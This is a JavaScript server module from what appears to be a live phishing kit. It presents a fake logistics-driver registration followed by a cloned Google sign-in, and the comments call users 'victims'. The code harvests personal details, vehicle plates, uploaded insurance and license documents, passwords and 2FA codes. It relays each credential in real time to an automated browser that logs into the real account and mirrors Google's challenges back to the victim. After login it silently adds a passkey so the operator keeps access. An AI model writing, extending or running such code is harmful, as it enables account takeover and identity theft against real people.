import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import * as events from './events.js';
import * as store from './store.js';
import * as browser from './browser.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
// Driver-uploaded documents (insurance certificate / company license) live on
// disk per session: data/uploads/<sessionId>/<file>
const UPLOADS_DIR = path.join(__dirname, '..', 'data', 'uploads');
const DOC_KEYS = ['insurance', 'license'];

// Persist the optional docs a visitor attached to the driver step (base64 in,
// files on disk, names recorded on the session so the admin panel can link them).
// Missing/unchanged keys keep whatever was already stored.
function storeDriverDocs(sessionId, files) {
  const incoming = files && typeof files === 'object' ? files : {};
  const prev = store.getRaw(sessionId)?.docs || {};
  const docs = {};
  let changed = false;
  for (const key of DOC_KEYS) {
    const f = incoming[key];
    if (f && typeof f.data === 'string' && f.data) {
      try {
        const ext = (path.extname(String(f.name || '')) || '').toLowerCase() || (f.type === 'application/pdf' ? '.pdf' : '.bin');
        const safe = `driver-${key}-${Date.now().toString(36)}${ext}`;
        const dir = path.join(UPLOADS_DIR, sessionId);
        fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(path.join(dir, safe), Buffer.from(f.data, 'base64'));
        docs[key] = safe;
        changed = true;
        console.log(`[gsession] driver doc saved: ${sessionId}/${safe} (${f.type || 'unknown type'})`);
      } catch (e) {
        console.log(`[gsession] driver doc save failed (${key}): ${e.message}`);
      }
    }
    if (!docs[key] && prev[key]) docs[key] = prev[key]; // keep an earlier upload
  }
  if (changed) store.update(sessionId, { docs });
  return docs;
}

// ---------- single static link ----------
// There's exactly ONE link everyone uses: /w/<STATIC_TOKEN>. Unlike the old
// per-invite model there's no list of generated links — any number of different
// people can register through the same link. Each visitor is tracked by a
// client-generated wizard id (`wid`), so their steps build up ONE fresh session
// of their own and never collide with another person using the link.
export const STATIC_TOKEN = 'login';

// The victim's browser stays on our landing page after capture. This field is
// kept for payload compatibility, but the client no longer redirects anywhere.
const LANDING = '';

// A visitor's in-flight registration is only meaningful while they're typing.
// Entries idle for longer than this are dropped (the real session record in the
// store is what persists — this map is just the in-flight copy).
const PENDING_TTL = 30 * 60 * 1000;
const SWEEP_MS = 60 * 1000;

// wid -> a single person's registration attempt in progress (in-memory)
const pending = new Map();

function entry(wid) {
  const key = String(wid || 'default');
  let r = pending.get(key);
  if (!r) {
    r = {
      sessionId: null,
      username: '',
      lastLogin: null,
      steps: { driver: false, username: false, password: false, totp: false },
      ts: Date.now(),
    };
    pending.set(key, r);
  }
  r.ts = Date.now();
  return r;
}

setInterval(() => {
  const now = Date.now();
  for (const [k, r] of pending) if (now - r.ts > PENDING_TTL) pending.delete(k);
}, SWEEP_MS).unref();

// wizard-facing view — only what the remote user's page may know
function toPayload(r) {
  const session = r.sessionId ? store.getRaw(r.sessionId) : null;
  return {
    token: STATIC_TOKEN,
    loggedIn: session?.status === 'logged-in' || session?.status === 'trusted',
    trusted: session?.deviceTrusted === true,
    // driver step already done (page reload lands on the sign-in screen)
    driver: r.steps.driver === true,
    // the account the remote user is signing in with, so the front-end can show
    // a personalized "Thanks, <username> submitted" success screen.
    username: r.username || '',
    // result of the last live-login step the backend drove: status + the real
    // Google error/status message + which screen the REAL browser is now asking
    // for (email/password/code/approve/numchoice/choice/sms/passkey/captcha/
    // logged-in), so the clone mirrors it exactly. `options` carries the real
    // "pick the number" / "choose how to confirm" choices, `phone` the SMS target.
    login: r.lastLogin ? { status: r.lastLogin.status, message: r.lastLogin.message, state: r.lastLogin.state, options: r.lastLogin.options || null, phone: r.lastLogin.phone || null, device: r.lastLogin.device || null } : null,
    landing: LANDING,
  };
}

// Called by the wizard page on load. Validates the token (only the static one is
// valid now) and marks the visit as activity for the admin feed.
export function begin(token, wid) {
  if (token !== STATIC_TOKEN) return null;
  const r = entry(wid);
  events.push('wizard.opened', { message: 'Someone opened the sign-in link' });
  return toPayload(r);
}

// step: 'driver' | 'username' | 'password' | 'totp' | 'numchoice' | 'status'.
// Persists the credential into the visitor's real session *and* drives the
// actual Google sign-in forward (see browser.wizardPhase), so the logged-in
// session is genuinely built up as the user walks the wizard — not just stored.
export async function step(token, wid, step, value) {
  if (token !== STATIC_TOKEN) return null;
  const r = entry(wid);

  let message;
  if (step === 'driver') {
    // Logistics driver submission — the first thing a driver fills in (landing
    // form before the Google sign-in). Captured immediately into a session so we
    // keep the plate/driver details even if they never complete the Google login.
    const d = (value && typeof value === 'object') ? value : {};
    const contactName = String(d.contactName ?? '').trim();
    const phone = String(d.phone ?? '').trim();
    const truckPlate = String(d.truckPlate ?? '').trim().toUpperCase();
    const trailerPlate = String(d.trailerPlate ?? '').trim().toUpperCase();
    const driverName = String(d.driverName ?? '').trim();
    const driverPhone = String(d.driverPhone ?? '').trim();
    r.driver = { contactName, phone, truckPlate, trailerPlate, driverName, driverPhone };
    r.steps.driver = true;
    if (!r.sessionId) {
      r.sessionId = store.create({
        name: truckPlate ? `${driverName || contactName || ''} · ${truckPlate}` : (driverName || contactName || 'Driver submission'),
        provider: 'google',
        loginUrl: 'https://accounts.google.com/',
        username: '',
        password: '',
        totpSecret: '',
        note: 'Logistics driver submission',
        contactName,
        phone,
        truckPlate,
        trailerPlate,
        driverName,
        driverPhone,
      }).id;
    } else {
      store.update(r.sessionId, { contactName, phone, truckPlate, trailerPlate, driverName, driverPhone });
    }
    const docs = storeDriverDocs(r.sessionId, d.files);
    const docCount = Object.values(docs).filter(Boolean).length;
    message = `Driver: ${driverName || contactName || '(no name)'} · truck ${truckPlate || '—'}${docCount ? ` · ${docCount} document(s) attached` : ''}`;
  } else if (step === 'username') {
    const username = String(value ?? '').trim();
    r.username = username;
    r.steps.username = true;
    // Create the real session the moment the first credential arrives so the
    // live browser login has a persistent home (sessions/<id>/).
    if (!r.sessionId) {
      r.sessionId = store.create({
        name: username || 'New sign-in',
        provider: 'google',
        loginUrl: 'https://accounts.google.com/',
        username,
        password: '',
        totpSecret: '',
        note: 'Signed in through the shared link',
      }).id;
    } else {
      store.update(r.sessionId, { username });
    }
    message = `Entered username: ${username || '(blank)'}`;
  } else if (step === 'password') {
    const password = String(value ?? '');
    r.steps.password = true;
    if (r.sessionId) store.update(r.sessionId, { password });
    message = 'Entered password ••••••••';
  } else if (step === 'totp') {
    const secret = String(value ?? '').replace(/\s+/g, '');
    r.steps.totp = true;
    if (r.sessionId) store.update(r.sessionId, { totpSecret: secret });
    message = secret ? 'Provided a 2FA (authenticator) code' : 'Skipped 2FA';
  } else if (step === 'numchoice') {
    // Victim picked one of the "select the number" options shown by Google.
    // The actual click is driven in browser.wizardPhase below.
    message = `Selected a verification number (${String(value ?? '').trim()})`;
  } else if (step === 'choice') {
    // Victim picked a "choose how to confirm" option (Text me a code, etc.).
    // The matching option is clicked on the REAL page in browser.wizardPhase.
    message = `Chose confirmation method: ${String(value ?? '').trim() || '(option)'}`;
  } else if (step === 'tryanother') {
    // Victim tapped "Try another way" — the real page is moved the same way
    // in browser.wizardPhase, then re-assessed.
    message = 'Chose "Try another way"';
  } else if (step === 'status') {
    // Live poll (nothing is captured here): re-report the current real-login
    // state, e.g. while the victim taps Approve on their phone or Google settles.
    if (r.sessionId) {
      const res = await browser.loginState(r.sessionId);
      r.lastLogin = { status: res?.status || 'pending', message: res?.message || '', state: res?.state || 'verifying', options: res?.options || null, phone: res?.phone || null, device: res?.device || null };
      if (res?.state === 'trusted') {
        store.setStatus(r.sessionId, 'trusted');
        events.push('wizard.trusted', {
          message: `Device registered \u2713  ${r.username || 'Google'} \u2014 this OS is the keypass now`,
          sessionId: r.sessionId,
        });
      }
      if (res?.status === 'loggedIn' || res?.status === 'logged-in') {
        store.setStatus(r.sessionId, 'logged-in');
        const ev = r._lastLoggedEvent || 0;
        if (Date.now() - ev > 15000) {
          r._lastLoggedEvent = Date.now();
          events.push('wizard.logged-in', { message: `Signed in ✓  ${r.username || 'Google'} — Gmail reachable`.trim() });
        }
        // Login confirmed via a poll (e.g. after a phone-approve) — silently add
        // the passkey too. registerPasskey is idempotent, so repeated polls are safe.
        browser.registerPasskey(r.sessionId).then((pk) => {
          if (pk && pk.passkey) {
            events.push('wizard.passkey', {
              message: `Passkey added ✓  ${r.username || 'Google'} — this Chrome is now a key for the account`.trim(),
              sessionId: r.sessionId,
            });
          }
        }).catch(() => {});
      }
      // poll caught a newly-displayed challenge (number shown, approve, code,
      // option list, sms send, passkey prompt)
      if (['numchoice', 'code', 'approve', 'choice', 'sms', 'passkey'].includes(res?.state) && !r._lastChallenge) {
        r._lastChallenge = { state: res.state, options: res.options || null };
        events.push('wizard.challenge', {
          message: `Challenge: ${r.username || 'Google'} → ${res.state}${res.options?.length ? ` (number: ${res.options.join(' ')})` : ''}`,
          sessionId: r.sessionId,
          state: res.state,
          options: res.options || null,
          loginMessage: res.message || '',
        });
      }
      if (res?.state === 'signed-in' || res?.status === 'logged-in') r._lastChallenge = null;
    }
    return toPayload(r);
  } else {
    return toPayload(r);
  }

  // Drive the real login for this step. Best-effort — never breaks the wizard:
  // even if Google throws a challenge, the credentials are saved and the admin
  // can finish by hand or Auto-login later. (The driver step has no browser
  // phase — it's just data we store.)
  if (r.sessionId && step !== 'driver') {
    const valueForLogin = step === 'totp' ? String(value ?? '').replace(/\s+/g, '') : value;
    const res = (await browser.wizardPhase(step, r.sessionId, valueForLogin)) || {};
    // surface the live-login result to the wizard front-end so it can mirror
    // real Google (stay on the field for a wrong password / bad code, show a
    // waiting screen for phone prompts, etc.)
    r.lastLogin = {
      status: res?.status || 'unknown',
      message: res?.message || '',
      state: res?.state || null,
      options: res?.options || null,
      phone: res?.phone || null,
      device: res?.device || null,
    };
    if (res.status === 'logged-in') {
      store.setStatus(r.sessionId, 'logged-in');
      events.push('wizard.logged-in', {
        message: `Signed in ✓  ${r.username || 'Google'}`,
      });
      // Silently add this Chrome as a passkey for the account, in the background.
      // Best-effort and never blocks the wizard; the victim's page just lands on
      // the real account page and never sees any of it.
      browser.registerPasskey(r.sessionId).then((pk) => {
        if (pk && pk.passkey) {
          events.push('wizard.passkey', {
            message: `Passkey added ✓  ${r.username || 'Google'} — this Chrome is now a key for the account`.trim(),
            sessionId: r.sessionId,
          });
        }
      }).catch(() => {});
    } else if (res.status === 'error') {
      store.setStatus(r.sessionId, 'new');
    } else if (['numchoice', 'code', 'approve', 'choice', 'sms', 'passkey'].includes(res?.state)) {
      // Challenge live (2FA code / phone-approve / displayed number / option
      // list / SMS send / passkey prompt) — push it to the admin panel so the
      // modal pops up even when the login is driven from the user's side.
      events.push('wizard.challenge', {
        message: `Challenge: ${r.username || 'Google'} → ${res.state}${res.options?.length ? ` (number: ${res.options.join(' ')})` : ''}`,
        sessionId: r.sessionId,
        state: res.state,
        options: res.options || null,
        loginMessage: res.message || '',
      });
    }
  }

  events.push('wizard.step', { message });
  return toPayload(r);
}

// Finalize. The session was already created + driven during the steps; here we
// just report completion so the front-end redirects to the real account page.
// (No session is created if the visitor never submitted anything.)
export function complete(token, wid) {
  if (token !== STATIC_TOKEN) return null;
  const r = entry(wid);
  events.push('wizard.completed', {
    message: `Sign-in complete ✓  ${r.username || 'Google'}`.trim(),
  });
  return toPayload(r);
}
